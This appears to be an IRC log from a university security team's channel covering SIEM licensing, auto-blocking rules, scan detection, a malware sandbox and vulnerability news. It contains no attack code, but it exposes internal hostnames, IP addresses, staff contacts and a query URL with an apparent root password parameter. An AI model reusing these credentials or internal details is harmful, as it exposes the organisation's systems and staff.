2014-12-16 11:02:01	wardog	ah. I'm in.
2014-12-16 11:02:14	wardog	Looks like we're hitting the free license limit.
2014-12-16 11:02:22	wardog	Is this ready to point at CITES for licensing?
2014-12-16 11:12:35	jazoff	possibly..
2014-12-16 11:12:43	jazoff	need to figure out what is wrong with the bro app
2014-12-16 11:13:15	jazoff	may end up clearing out /opt/splunk and starting over depending on what support says
2014-12-16 11:14:29	wardog	I, uh, went ahead and pointed it at them. Hope that's alright. We had 6 hard license violations, didn't think you could do much with it at that point.
2014-12-16 11:15:48	wardog	6 looks so fancy.
2014-12-16 11:15:52	jazoff	i
2014-12-16 11:15:54	jazoff	i'm sure it's fine
2014-12-16 11:16:18	jazoff	haven't wanted to do much in it until the bro issue is fixed
2014-12-16 11:16:29	jazoff	in case it turns out to be easier to just wipe and start over
2014-12-16 11:16:38	wardog	Have they acknowledged it at least?
2014-12-16 11:16:51	jazoff	waiting to hear back from cites about the support info
2014-12-16 11:16:52	wardog	Isn't Chris Green at Splunk now?
2014-12-16 11:16:56	jazoff	i believe so
2014-12-16 11:17:20	jazoff	cites needs to get me added as a supportable person i think before I can submit a request
2014-12-16 11:23:59	wardog	I talked to Matt. He said he's pinging Joe to see where that's at.
2014-12-16 11:24:10	jazoff	ok
2014-12-16 13:11:46	wardog	traffic to 217.23.3.200
2014-12-16 13:11:58	wardog	traffic from 217.23.3.200
2014-12-16 13:12:02	wardog	stach me
2014-12-16 13:12:03	ncsabot	Seen in 0 hours over 0 days. First seen in . Last seen in 
2014-12-16 13:12:03	ncsabot	Seen in 0 hours over 0 days. First seen in . Last seen in 
2014-12-16 13:12:14	wardog	squirrel
2014-12-16 13:12:22	jazoff	ship it
2014-12-16 13:12:23	ncsabot	http://images.cheezburger.com/completestore/2011/11/2/46e81db3-bead-4e2e-a157-8edd0339192f.jpg
2014-12-16 13:12:26	wardog	right
2014-12-16 16:21:55	jschipp	Can OSSEC add to BHR for web attacks like "Multiple XSS (Cross Site Scripting) attempts from same source ip" or "Multiple web server 400 error codes from same source ip"?
2014-12-16 16:22:15	jschipp	err, is it fine if I add that? opennsm gets scanned alot
2014-12-16 16:26:00	jazoff	don't see why not.. 
2014-12-16 16:26:09	jazoff	the script that ossec uses has a whitelist for qualys right?
2014-12-16 16:28:27	jschipp	do you what the qualys IP's are?
2014-12-16 16:30:26	wardog	I think the local one is 141.142.148.51
2014-12-16 16:30:37	wardog	THe other two locals are intra BW, right?
2014-12-16 16:30:41	wardog	And the external block is.....
2014-12-16 16:35:30	wardog	which one of you is 50.155.94.141?
2014-12-16 16:35:44	wardog	/db/db1/series?p=rootfoofoo&q=select+sum(value)+from+%22bro.ssh.login.failure%22+where+time+%3E+now()+-+15m+group+by+time(30s)+fill(0)+order+asc&u=root
2014-12-16 16:36:03	wardog	ah. ga..
2014-12-16 16:36:10	wardog	That's you jazoff 
2014-12-16 16:37:00	wardog	Qualyis is 64.39.96.0/20
2014-12-16 16:37:33	jschipp	yeah, they're there in ossec then
2014-12-16 16:37:37	jschipp	thanks
2014-12-16 16:38:15	jschipp	added the rules for a few web attacks
2014-12-16 16:38:44	jschipp	not me
2014-12-16 17:21:18	jazoff	yeah, apparenetly influxdb/grafana triggers sql injection alerts :)
2014-12-17 08:31:03	wardog	you.... could put it on ssl
2014-12-17 08:34:05	jazoff	yeah, i think the test container I was using supports ssl
2014-12-17 08:36:07	jazoff	grrr stupid lastpass
2014-12-17 08:36:24	jazoff	nessie wanted me to reset password, so the form had old + new + new
2014-12-17 08:36:37	jazoff	had lastpass generate a new one, so of course it filled out the form with new + new + new
2014-12-17 08:36:54	jazoff	managed to fix it, but not after getting locked out for 10 minutes
2014-12-17 08:36:57	jazoff	stupid security :)
2014-12-17 09:53:39	soehlert	jschipp: we used to have that in there but a bunch of Basney's stuff triggered it at crazy rates, but was perfectly ok. So probably don't bhr that for now until you can find a way to whitelist all that. In regards to the multiple XSS OSSEC stuff
2014-12-17 11:13:44	jschipp	soehlert: ah
2014-12-17 11:22:59	soehlert	jazoff: you know lua at all?
2014-12-17 11:30:44	jazoff	sort of
2014-12-17 11:39:05	jazoff	what uses lua?
2014-12-17 11:39:32	jazoff	ossec or something?
2014-12-17 12:11:00	jschipp	wireshark and nmap come to mind
2014-12-17 12:30:48	soehlert	jazoff: ya nmap. i was looking at playing with nse to do a shellshock check. the vulns.lua library seems to have errors though and ive never looked at lua
2014-12-17 12:36:01	eyrich	traffic to 113.142.37.149
2014-12-17 12:36:12	ncsabot	Seen in 0 hours over 0 days. First seen in . Last seen in 
2014-12-17 12:36:29	eyrich	traffic to 209.171.172.11
2014-12-17 12:36:35	ncsabot	Seen in 0 hours over 0 days. First seen in . Last seen in 
2014-12-17 12:36:44	eyrich	hmm, thats not right
2014-12-17 12:36:55	eyrich	jazoff: i think sometihng wrong with ncsabot
2014-12-17 12:39:34	jschipp	soehlert: one already exists if you want to use it or see how they did ithttp://seclists.org/nmap-dev/2014/q3/493
2014-12-17 12:45:49	soehlert	jschipp: i'm using an already written one
2014-12-17 12:45:49	soehlert	the problem is the vulns.lua library it depends on
2014-12-17 12:45:59	soehlert	in fact that is the one im using
2014-12-17 12:46:58	jschipp	ah
2014-12-17 12:47:25	jazoff	oh?
2014-12-17 12:47:34	soehlert	/usr/share/nmap/nse_main.lua:384: /usr/share/nmap/nselib/vulns.lua:207: attempt to call field 'module' (a nil value)
2014-12-17 12:47:49	jazoff	traffic to 50.155.94.141
2014-12-17 12:47:54	ncsabot	Seen in 909 hours over 42 days. First seen in 2014-11-04.db. Last seen in 2014-12-17.db
2014-12-17 12:48:03	jschipp	do you have the latest nmap?
2014-12-17 12:48:16	eyrich	ok i see i typoed my test
2014-12-17 12:48:23	soehlert	jschipp: nope apparently not
2014-12-17 12:48:26	eyrich	traffic to 209.174.172.11
2014-12-17 12:48:27	ncsabot	Seen in 4290 hours over 319 days. First seen in 2013-10-31.db. Last seen in 2014-12-17.db
2014-12-17 12:48:42	jazoff	:)
2014-12-17 12:49:01	jschipp	I'm sure the centos packages are old
2014-12-17 12:49:18	soehlert	5.5.1
2014-12-17 12:49:26	soehlert	that shouldnt affect the vulns library though i wouldnt think
2014-12-17 12:49:51	soehlert	that's not specific to this shellshock script and its been around a few years at least that i know of. i'll try updating first though in case
2014-12-17 12:50:52	jschipp	yeah, dev in nmap world seems to be heavy and constantly moving so I would try that first
2014-12-17 13:27:08	jazoff	eyrich: so was that just a typo and it's working ok?
2014-12-17 14:27:30	eyrich	yes
2014-12-17 14:27:45	jazoff	ok :)
2014-12-17 14:29:53	jschipp	Has anyone had a chance to look at the Grinch bug? https://www.alertlogic.com/blog/dont-let-grinch-steal-christmas/
2014-12-17 14:31:22	jschipp	looks like it might be hype but I'm having a tough time getting myself to read the article to verify
2014-12-17 14:35:35	jazoff	i'm confused on what the issue even is
2014-12-17 14:38:27	jazoff	http://seclists.org/oss-sec/2014/q4/1077
2014-12-17 14:38:35	jazoff	'So TL;DR: it's not a security vulnerability, and it will NOT be getting
2014-12-17 14:38:36	jazoff	a CVE.'
2014-12-17 14:56:23	jazoff	this is more of an issue: http://seclists.org/oss-sec/2014/q4/1052
2014-12-17 15:17:59	jschipp	that's what i figure
2014-12-17 15:18:04	jschipp	figured*
2014-12-17 15:18:11	jschipp	thanks for looking into it lol
2014-12-17 15:19:21	wardog	grinch is a vuln with polkit + pkcon + compromised account in wheel.
2014-12-17 15:19:23	wardog	It's stupid
2014-12-17 15:19:43	wardog	It lets you install whatever package you want.
2014-12-17 15:19:51	wardog	Like I said, its stupid.
2014-12-17 15:20:20	jazoff	that kind of thing can be bad, but probably not enabled on any real shared box
2014-12-17 15:20:36	jazoff	especially if yum would let you do something like install a package by url
2014-12-17 15:20:49	jazoff	since then you could install an arbitrary suid binary or at least an older rpm with a known vuln
2014-12-17 15:21:08	jazoff	but they could also potentially remove the kernel or libc... :)
2014-12-17 15:33:05	wardog	traffic to 211.94.145.93
2014-12-17 15:33:11	ncsabot	Seen in 0 hours over 0 days. First seen in . Last seen in 
2014-12-17 16:04:31	jazoff	need to fix that message to say "yay?"
2014-12-18 02:19:08	--	irc: disconnected from server
2014-12-18 02:32:59	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2014-12-18 02:32:59	--	Channel #security: 6 nicks (0 ops, 0 halfops, 0 voices, 6 normals)
2014-12-18 02:33:11	--	Mode #security [+]
2014-12-18 02:33:11	--	Channel created on Tue, 04 Feb 2014 20:39:53
2014-12-18 04:17:09	--	irc: disconnected from server
2014-12-18 04:17:19	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2014-12-18 04:17:19	--	Channel #security: 6 nicks (0 ops, 0 halfops, 0 voices, 6 normals)
2014-12-18 04:17:31	--	Mode #security [+]
2014-12-18 04:17:31	--	Channel created on Tue, 04 Feb 2014 20:39:53
2014-12-18 08:25:36	jazoff	soehlert: so.. trying to figure out why the archive srcript on seclogs is still not running..
2014-12-18 08:25:57	jazoff	looks like sendmail isn't running either?
2014-12-18 08:26:19	jazoff	which probably explains why there are no emails
2014-12-18 08:28:52	jazoff	manually running the archive script now to deal with the backlog
2014-12-18 09:41:49	soehlert	gah alright. this is so weird
2014-12-18 14:05:33	soehlert	well this isnt good. http://www.darknet.org.uk/2014/12/icann-hacked-including-root-dns-systems/
2014-12-18 14:08:39	jazoff	i saw that yesterday...
2014-12-18 14:08:40	jazoff	the title is BS
2014-12-18 14:08:52	jazoff	supposedly it was just the wiki or something like that that was compormised
2014-12-18 14:08:54	wardog	traffic to 203.131.222.102
2014-12-18 14:08:55	soehlert	ya reading the article brought the tone down quite a bit
2014-12-18 14:08:59	ncsabot	Seen in 0 hours over 0 days. First seen in . Last seen in 
2014-12-18 14:09:06	wardog	traffic to 217.96.33.164
2014-12-18 14:09:12	ncsabot	Seen in 0 hours over 0 days. First seen in . Last seen in 
2014-12-18 14:09:13	wardog	traffic to 88.53.215.64
2014-12-18 14:09:23	wardog	traffic to 200.87.126.116
2014-12-18 14:09:23	ncsabot	Seen in 0 hours over 0 days. First seen in . Last seen in 
2014-12-18 14:09:28	ncsabot	Seen in 150 hours over 16 days. First seen in 2014-03-12.db. Last seen in 2014-08-04.db
2014-12-18 14:09:34	wardog	traffic to 58.185.154.99
2014-12-18 14:09:40	ncsabot	Seen in 0 hours over 0 days. First seen in . Last seen in 
2014-12-18 14:09:45	wardog	traffic to 212.31.102.100
2014-12-18 14:09:51	ncsabot	Seen in 0 hours over 0 days. First seen in . Last seen in 
2014-12-18 14:09:51	wardog	traffic to 208.105.226.235
2014-12-18 14:09:57	ncsabot	Seen in 0 hours over 0 days. First seen in . Last seen in 
2014-12-18 14:10:55	soehlert	jazoff: is it possible in puppet to do the users:extra_groups thing differently on different hosts? aka we're all in wheel by default, but on outbox, i want us to also be in outbox. 
2014-12-18 14:12:02	jazoff	may have to do it separately
2014-12-18 14:12:15	soehlert	huh?
2014-12-18 14:12:36	soehlert	i mean i knew i couldnt do it in our default spot, but how can i add outbox in another palce just for bw-outbox?
2014-12-18 14:12:57	jazoff	well you can make hosts/bw-outbox.yml and add the class there
2014-12-18 14:13:29	soehlert	but that's not a class. the extra_groups is a part of the user class
2014-12-18 14:13:52	jazoff	hmm
2014-12-18 14:14:00	soehlert	oh unless i make that a variable in the default user class and then in common.yaml add wheel and in outbox add this to the array?
2014-12-18 14:14:25	jazoff	yeah, that would work
2014-12-18 14:14:41	soehlert	though that may be more work than its worth since i'll have to add the cray users to outbox group too. 
2014-12-18 14:14:45	jazoff	yeah
2014-12-18 14:15:00	jazoff	i think you can just add a user to a group using puppet
2014-12-18 14:16:21	jazoff	maybe not
2014-12-18 14:16:36	soehlert	ya i could do some hacky stuff with an exec
2014-12-18 14:16:43	jazoff	i used to do it using the low level usermod stuff
2014-12-18 14:16:45	soehlert	it might be easier to just run a script that does it for me
2014-12-18 14:17:21	soehlert	or just do it by hand. its like 12 people
2014-12-18 14:18:13	jazoff	:)
2014-12-18 14:22:38	jazoff	definitely was a PITA when I did it last
2014-12-18 14:25:36	jazoff	soehlert: fyi: +  file{"/updload":
2014-12-18 14:27:45	soehlert	that was....a test? 
2014-12-18 14:27:45	soehlert	(oops)
2014-12-18 14:54:26	wardog	Grinch> http://blog.trendmicro.com/trendlabs-security-intelligence/doubts-raised-about-grinch-linux-vulnerability
2014-12-18 14:58:56	jazoff	primarily the doubt of there even being a vulnerability?
2014-12-18 14:59:51	soehlert	wait, they need physical access for this to work?
2014-12-18 15:01:17	jazoff	i think the default policy only allows people logged into the console to install packages?
2014-12-18 15:54:03	jazoff	https://github.com/blog/1938-git-client-vulnerability-announced
2014-12-18 16:00:24	soehlert	so if i only use git with our stuff i should be fine right? 
2014-12-18 16:04:18	jazoff	yeah
2014-12-18 16:04:41	jazoff	so i've been looking at some of the bhr history for ips in the new system in testing at cites
2014-12-18 16:04:48	jazoff	definitely need to tweak the block time scaling
2014-12-18 16:04:50	jazoff	it's way too nice
2014-12-18 16:07:00	jazoff	the worst offender was 118.69.232.139/32 which was blocked 47 times
2014-12-18 16:07:45	soehlert	sweet, seems homebrew is broken on yosemite
2014-12-18 16:09:20	jazoff	ah, and I think i just realized something kinda dumb
2014-12-18 16:09:35	jazoff	not sure if the default notice suppression interval kicks in for scans
2014-12-18 16:09:47	soehlert	oooo
2014-12-18 16:13:24	jazoff	yeah.. so that needs fixing
2014-12-18 16:14:15	jazoff	not an issue if you are blocking for more than an hour, but it is if you aren't
2014-12-19 07:48:20	jazoff	172.30.65.203 is scanning internally on port 445
2014-12-19 07:49:13	jazoff	not sure what it is coming from though
2014-12-19 09:02:45	wardog	is that that campus wireless network?
2014-12-19 09:03:20	wardog	https://www.cites.illinois.edu/dns/oncampus-ranges.html
2014-12-19 09:04:45	wardog	It is
2014-12-19 09:04:57	wardog	oh, wait.
2014-12-19 09:04:58	wardog	no
2014-12-19 09:05:05	wardog	Just outside.
2014-12-19 09:09:04	eyrich	thats NCSA's part of campus routable
2014-12-19 09:10:41	eyrich	not finding it in net dot
2014-12-19 09:12:10	jazoff	it seems to have stopped anyway
2014-12-19 09:12:43	wardog	172.13/16 goes from 172.13 to 172.23.
2014-12-19 09:12:52	wardog	er, 172.16/13
2014-12-19 09:13:06	wardog	172.16->172.23
2014-12-19 09:13:17	eyrich	ya thats the campus side
2014-12-19 09:13:35	wardog	But the address Justin is showing is 172.30
2014-12-19 09:13:48	wardog	oooooooh
2014-12-19 09:13:55	wardog	I looked further down the page.
2014-12-19 09:13:57	eyrich	which is part of 172.24.0.0/13
2014-12-19 09:14:15	wardog	That's NCSA private space....
2014-12-19 09:14:28	eyrich	yes
2014-12-19 09:14:59	eyrich	thats what i said - NCSA's portion of the campus routable IP space
2014-12-19 09:15:15	wardog	I think it's NCSA's portion of the campus routable IP space.
2014-12-19 09:15:35	wardog	;)
2014-12-19 09:58:19	jazoff	the romanian logins from petrica probably legit?
2014-12-19 10:06:55	wardog	My guess is it's Boris
2014-12-19 11:24:29	soehlert	jazoff: if you use s3cmd, do you have to install s3? nirmal said he'd have to do that individually..
2014-12-19 11:24:36	jazoff	install?
2014-12-19 11:24:40	soehlert	im not sure if he's unclear or if i am
2014-12-19 11:24:47	soehlert	"At this point we will have to do the s3 install and config for each user individually and push out any changes to the config out of band."
2014-12-19 11:25:08	jazoff	maybe he means the ~/.s3cfg ?
2014-12-19 11:26:05	soehlert	can they share a config and then k;
2014-12-19 11:26:12	soehlert	gahhh stupid netowrk connectivity.
2014-12-19 11:26:35	soehlert	can they just share one config?
2014-12-19 11:26:51	jazoff	probably a flag or env variable for the path to the config
2014-12-19 11:27:54	soehlert	have you ever installed s3cmd from their repos?
2014-12-19 11:28:39	jazoff	no
2014-12-19 11:28:48	soehlert	ok
2014-12-19 11:28:50	jazoff	it's just a python program
2014-12-19 11:29:04	soehlert	right just curious if it installs a default config file
2014-12-19 11:29:11	soehlert	but i cna go hunting
2014-12-19 11:29:32	jazoff	probably dont want to use that since the keys need to go in the config
2014-12-19 11:29:55	soehlert	why does that matter? won't they be sharing keys?
2014-12-19 11:30:57	soehlert	in fact they must, since he wants a shared account..
2014-12-19 11:33:34	jazoff	oh
2014-12-19 11:33:37	jazoff	i see
2014-12-19 11:33:49	soehlert	so it seems like one config would be fine
2014-12-19 11:33:57	soehlert	-c points to config file
2014-12-19 13:01:15	jazoff	apparently there are a number of vulnerabilities in ntp
2014-12-19 13:03:38	jazoff	http://www.kb.cert.org/vuls/id/852879
2014-12-19 13:16:29	jazoff	that 172.30.65.203 host is scanning again
2014-12-19 13:16:41	jazoff	any way to track it down?
2014-12-19 13:31:46	jazoff	bhr block scaling working a little better since i fixed that bro issue
2014-12-19 13:31:58	jazoff	found a few hosts in the logs blocked 45 minutes apart
2014-12-19 14:26:27	jschipp	fyi: our CIF system is federated with campus now, they can query our feeds
2014-12-19 14:29:00	jazoff	cool
2014-12-19 14:29:14	jazoff	I started looking into how best to get bro to use intel to tweak bhr block times
2014-12-19 14:29:22	jazoff	it is less than straightforward
2014-12-19 14:29:38	jazoff	but I think doable
2014-12-19 14:29:46	jazoff	well, definitely doable for block times, for block thresholds, not sure
2014-12-19 14:30:17	jazoff	a compromise could be to just use country code lookups for that
2014-12-19 15:18:23	jschipp	kk
2014-12-19 15:19:08	jazoff	apparently the reason intel data is mostly log only is that only the manager has it (i think)
2014-12-19 15:19:11	jazoff	so workers can't actually do lookups
2014-12-19 15:21:48	jschipp	ah
2014-12-19 15:22:46	jschipp	during scan detection event couldn't you query the CIF API via curl for the address? it would be slow but I imagine it would work
2014-12-19 15:23:33	jazoff	well you can query it on the manager
2014-12-19 15:23:51	jazoff	so i think what needs to be done is make a copy of the scan policy with the lower threshold to be used for things in cif
2014-12-19 15:24:07	jazoff	this would alert for ALL hosts, but in the notice handler, which runs on the manager, you could look it up in the intel table
2014-12-19 15:24:25	jazoff	and then supress it for hosts NOT found
2014-12-19 15:24:30	jazoff	kinda backwards, but i think it would work
2014-12-19 15:26:00	jschipp	i see
2014-12-19 17:21:09	jazoff	read more on the ntp exploit, this could be bad
2014-12-19 17:21:34	jazoff	word of a single packet exploit
2014-12-19 20:12:13	wardog	jazoff: send the IP and timestamp of events to help+neteng@ncsa.illinois.edu and they should be able to find it. I hope.
2014-12-20 11:36:58	jazoff	wardog: sent
2014-12-22 11:52:57	jazoff	something odd with fog...
2014-12-22 11:53:14	jazoff	was in the top talker report with 385845169 packets
2014-12-22 11:53:31	jazoff	tons of traffic to 194.36.2.4 and 194.36.2.5
2014-12-22 11:53:51	jazoff	which is afs2.hep.man.ac.uk. and afs3.hep.man.ac.uk.
2014-12-22 11:54:26	jazoff	wtf was fog doing?
2014-12-22 11:54:29	ncsabot	Seen in 2754 hours over 207 days. First seen in 2013-10-31.db. Last seen in 2014-12-22.db
2014-12-22 11:55:37	jazoff	doesnt look like it ever responded, did the afs client just shit itself?
2014-12-22 12:35:39	jazoff	traffic to 13.142.37.149
2014-12-22 12:35:44	ncsabot	Seen in 0 hours over 0 days. First seen in . Last seen in 
2014-12-22 12:35:49	jazoff	ninfo bro_pdns dmp.coolyun.com
2014-12-22 12:35:50	ncsabot	Empty Result
2014-12-22 12:36:11	jazoff	traffic to 113.142.37.149
2014-12-22 12:36:21	ncsabot	Seen in 0 hours over 0 days. First seen in . Last seen in 
2014-12-22 12:36:44	jazoff	traffic to 113.142.37.246
2014-12-22 12:36:44	ncsabot	Seen in 0 hours over 0 days. First seen in . Last seen in 
2014-12-22 13:12:20	wardog	Did we forget to set up a system for time machine. Oh, waiting for SAN
2014-12-22 13:12:43	jazoff	no.. we were just waiting to decomission a box or two
2014-12-22 13:12:48	jazoff	I think we can proceed now
2014-12-22 15:35:28	wardog	traffic to 91.109.21.205
2014-12-22 15:35:35	ncsabot	Seen in 0 hours over 0 days. First seen in . Last seen in 
2014-12-22 15:35:38	wardog	w00t
2014-12-22 15:45:19	jazoff	ninfo cif 91.109.21.205
2014-12-22 15:45:26	ncsabot	Empty Result
2014-12-29 09:44:48	jazoff	quiet day :)
2014-12-31 00:34:46	--	irc: disconnected from server
2014-12-31 00:34:57	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2014-12-31 00:34:57	--	Channel #security: 6 nicks (0 ops, 0 halfops, 0 voices, 6 normals)
2014-12-31 00:35:09	--	Mode #security [+]
2014-12-31 00:35:09	--	Channel created on Tue, 04 Feb 2014 20:39:53
2014-12-31 11:20:46	<--	wardog (wraquel@hidden-3819C22F.ncsa.illinois.edu) has quit (Quit: happy new year!)
2014-12-31 11:21:35	-->	wraquel (wraquel@hidden-3819C22F.ncsa.illinois.edu) has joined #security
2015-01-05 08:25:05	jazoff	morning :)
2015-01-05 08:25:09	jazoff	everyone back today?
2015-01-05 08:31:33	wraquel	I'll be back tomorrow
2015-01-05 10:24:04	jschipp	I'm back today
2015-01-06 08:16:32	jazoff	ugh, more ntp crap
2015-01-06 08:17:13	jazoff	yep, desbuild.cosmology.illinois.edu is open ntp
2015-01-06 08:19:37	jazoff	going to nullroute
2015-01-06 08:21:06	jazoff	done, verified it is no longer reachable from home
2015-01-06 08:22:03	jazoff	whos the contact for the DES stuff?
2015-01-06 09:43:49	wraquel	Todd Tomashek
2015-01-06 09:43:57	wraquel	I think.
2015-01-06 09:43:59	wraquel	I'm pretty sure.
2015-01-06 09:44:33	wraquel	tomashek@illinois.edu
2015-01-06 09:45:04	jazoff	ok
2015-01-06 09:47:41	jazoff	sent
2015-01-06 09:54:38	wraquel	ntp amp?
2015-01-06 10:01:15	jazoff	yeah
2015-01-06 13:27:01	wraquel	soehlert: I turned off Openfire (not IRC) on blizzard.
2015-01-06 13:27:13	wraquel	It has been moved to ops-security.xsede.org
2015-01-06 13:45:25	jazoff	that's not in puppet is it?
2015-01-06 13:45:32	jazoff	(puppet is't going to just restart it?)
2015-01-06 13:50:26	jazoff	ah, it has profile 'irc', so i dont think so
2015-01-06 13:50:50	jazoff	puppet looks to be broken anyway :)
2015-01-07 06:52:46	<--	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Connection reset by peer)
2015-01-07 07:10:15	-->	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2015-01-07 09:47:20	jazoff	soehlert: i think i fixed the log archive problem.. 
2015-01-07 09:47:29	jazoff	/etc/cron.d/archive had to not be executable
2015-01-07 09:53:31	soehlert	oops good catch
2015-01-07 09:54:03	jazoff	yeah.. i vaguely remember something about that being enforced
2015-01-07 09:54:03	soehlert	and yes to answer your question from yesterday, puppet was never finished for IRC
2015-01-07 10:05:53	jazoff	crazy how many top talkers we see 
2015-01-07 10:06:04	jazoff	at UA i think my top talker whitelist was like 30 hosts
2015-01-07 10:06:07	jazoff	up to 353
2015-01-07 10:06:21	jazoff	granted a bunch are qualys, need to update the program to support cidr blocks
2015-01-07 12:01:39	wraquel	what does 'not legit' mean in the top talkers again?
2015-01-07 12:05:13	jazoff	oh, it means it is in the database, but not marked as legit
2015-01-07 12:05:21	jazoff	as in, i know it's a top talker, but not why
2015-01-07 12:25:02	jazoff	interesting post: https://stribika.github.io/2015/01/04/secure-secure-shell.html
2015-01-07 12:25:58	jazoff	not 100% sure on the takeaways, but might be worth updating the ssh template in puppet
2015-01-07 13:36:43	soehlert	sounds interesting, gonna read it here
2015-01-07 13:55:36	jazoff	yeah, lots of stuff these days about securing ssl configs, haven't seen as much about ssh
2015-01-07 13:55:51	jazoff	wouldn't be surprised if qualys starts alerting about things like insecure ssh ciphers
2015-01-07 15:32:37	jazoff	nids-dev4 appears to have crashed
2015-01-07 15:34:45	jazoff	ah, back up, 0 uptime. odd
2015-01-08 11:15:47	jschipp	Cuckoo Sandbox works now, submit your warez http://cuckoo-sec.ncsa.illinois.edu/
2015-01-08 11:16:22	jschipp	lots of customization and integration to do yet
2015-01-08 11:16:56	jschipp	also, could use more hd space, we can only analyze 3 things at a time
2015-01-08 11:17:04	jazoff	cool
2015-01-08 11:17:21	jazoff	need to reconfigure bro to dump out exes
2015-01-08 11:23:40	jazoff	could probably send them all.. only 116 exes downloaded in 2015
2015-01-08 11:24:29	jazoff	well, that aren't whitelisted
2015-01-08 11:24:36	jschipp	yep, let me do that though :) I have a few ideas
2015-01-08 11:24:51	jazoff	i'll update the http exe whitelist, it's been a while
2015-01-08 11:24:52	jschipp	going to do an IRC api too
2015-01-08 11:26:21	jazoff	cool
2015-01-08 11:35:27	jazoff	i submitted some recent exe urls...
2015-01-08 11:35:30	jazoff	not sure if it worked though
2015-01-08 11:40:05	jschipp	crap, ran out of disk space
2015-01-08 11:40:24	jazoff	my bads :)
2015-01-08 11:40:34	jazoff	so, 2 things at a time :)
2015-01-08 11:41:47	jschipp	lol I did 3 yesterday and it works, hmmm. It left the memory dumps and stuff so that's prob why
2015-01-08 11:42:09	jazoff	that why it says completed but not reported?
2015-01-08 11:43:08	jazoff	ah, and 141.142.236.66 needs to be ignored from the http exe urls :)
2015-01-08 11:46:15	jschipp	ah, bummer, hold off for now
2015-01-08 11:46:37	jschipp	it was the memory dumps. Yeah, not enough space to generate reports lol
2015-01-08 11:46:38	jschipp	2015-01-08 11:38:11,151 [lib.cuckoo.core.plugins] WARNING: The reporting module "JsonDump" returned the following error: Failed to generate JSON report: [Errno 28] No space left on device
2015-01-08 11:46:53	jazoff	oh :)
2015-01-08 11:46:58	jazoff	lemme know when I should try again
2015-01-08 11:47:08	jschipp	kk, let me clean up all my tests from yesterday
2015-01-08 11:47:16	jazoff	hah, adam just emailed the link to that ssh article i mentioned here the other day
2015-01-08 11:48:16	jschipp	I saw that :)
2015-01-08 11:48:33	jschipp	only if he was in irc
2015-01-08 11:48:42	jschipp	you can try it now
2015-01-08 11:52:13	jazoff	hmm, it's pending
2015-01-08 11:56:42	jschipp	ah, the vm's were left in a bad state
2015-01-08 11:56:49	jschipp	jesus
2015-01-08 11:57:29	jazoff	i'm just breaking everythign aren't i
2015-01-08 11:57:32	jschipp	one sec, I'm reorganizing logical volumes 
2015-01-08 11:57:33	jschipp	lol
2015-01-08 13:08:12	jazoff	should i try resubmitting?
2015-01-08 13:32:40	jschipp	jazoff ah, sorry, got sidetracked. Yeah, go for it but just do 1 analysis for now.
2015-01-08 13:41:10	jazoff	    Error: The analysis hit the critical timeout, terminating.
2015-01-09 07:08:46	eyrich	what system does thruk authenticate against?
2015-01-09 09:06:07	wraquel	I thought thruk was local
2015-01-09 09:07:18	eyrich	i dont have a lastpass entry for it
2015-01-09 09:16:36	soehlert	it is local and kerberos i think
2015-01-09 09:17:16	eyrich	@NCSA.EDU for kerb realm?
2015-01-09 09:17:40	soehlert	dealing with the aftermath of a frozen/burst pipe today. depending how soon the plumber comes to fix it and we get cleaned up, I may just finish from here or come in not sure yet
2015-01-09 09:17:40	soehlert	and ya it should be eyrich i think
2015-01-09 09:17:55	eyrich	none of those working
2015-01-09 09:17:59	soehlert	youll be prompted for a password twice
2015-01-09 09:18:06	eyrich	soehlert: SUCK, I have a plumber coming today too
2015-01-09 09:18:06	soehlert	first is kerberos
2015-01-09 09:18:06	soehlert	then its the local stuff
2015-01-09 09:18:09	eyrich	but not for an emergency
2015-01-09 09:18:32	eyrich	I guess I need a password reset then
2015-01-09 09:18:40	soehlert	eyrich: i told my landlord there should be insulation on the outside kitchen wall since we noticed there was none last year when this happened
2015-01-09 09:18:49	soehlert	and no its a shared local password for thrukadmin
2015-01-09 09:19:05	eyrich	no locla users at all?
2015-01-09 09:19:10	eyrich	no individual i mean?
2015-01-09 09:19:18	soehlert	you can tell if your kerberos worked since it slightly changes the message for asking for a password
2015-01-09 09:19:22	soehlert	no individual users
2015-01-09 09:19:28	eyrich	ok.
2015-01-09 09:19:31	soehlert	for the local pass part
2015-01-09 09:19:41	soehlert	its a mess, but i think it was the best jon could do
2015-01-09 09:19:46	eyrich	:)
2015-01-09 09:20:00	soehlert	as in thruk itself sucks about that
2015-01-09 09:20:16	eyrich	doesnt it use some apache plugin for auth?
2015-01-09 09:20:33	soehlert	i guess not, idk. i never looked at it just remember jon complaining about it
2015-01-09 09:20:35	eyrich	but maybe not individual users and mapping - that I can see
2015-01-09 09:43:20	jazoff	so, there's https://www.openssl.org/news/secadv_20150108.txt
2015-01-09 09:55:23	soehlert	at least its just DoS
2015-01-09 10:29:46	soehlert	eyrich: i need to do some testing on polot, can you please open up port 222 from fog to polot?
2015-01-09 10:34:26	eyrich	what ip is polot?
2015-01-09 10:42:19	wraquel	polo test?
2015-01-09 10:43:00	eyrich	IPs have moved I want to make sure I create the proper rule, so I am asking soehlert what is the end point IP you need fog to access.
2015-01-09 10:43:52	soehlert	141.142.149.23
2015-01-09 10:44:39	eyrich	ty
2015-01-09 10:47:13	eyrich	soehlert: give it a go
2015-01-09 10:47:41	soehlert	thanks
2015-01-09 10:50:47	jschipp	eyrich: http auth is built into thruk's php scripts, no option to change it, and I tried editing the php but I wasn't able keep everything working to much reliance
2015-01-09 10:50:55	jschipp	too*
2015-01-09 10:51:13	eyrich	ok thanks
2015-01-09 10:52:18	jschipp	Auth is kinda broken right now, it asks for a user to authenticate but it's not the same as it used to be prior to CentOS upgrade. I forgot to fix it because I rarely use the WUI anymore and terry reported it yesterday so I'm going to look at it again
2015-01-09 10:52:59	jschipp	and the realm is NCSA.EDU
2015-01-09 10:58:24	soehlert	eyrich: you can close that hole i had you open. got it working
2015-01-09 10:58:31	eyrich	ok
2015-01-09 11:04:08	eyrich	soehlert: done
2015-01-09 11:15:33	soehlert	thanks
2015-01-09 11:44:42	eyrich	time to go home and wait for the plumber. IM or SMS if you need something
2015-01-09 15:22:03	soehlert	so we have someone working on BW from RO. is there a quick way to check the legitimacy?
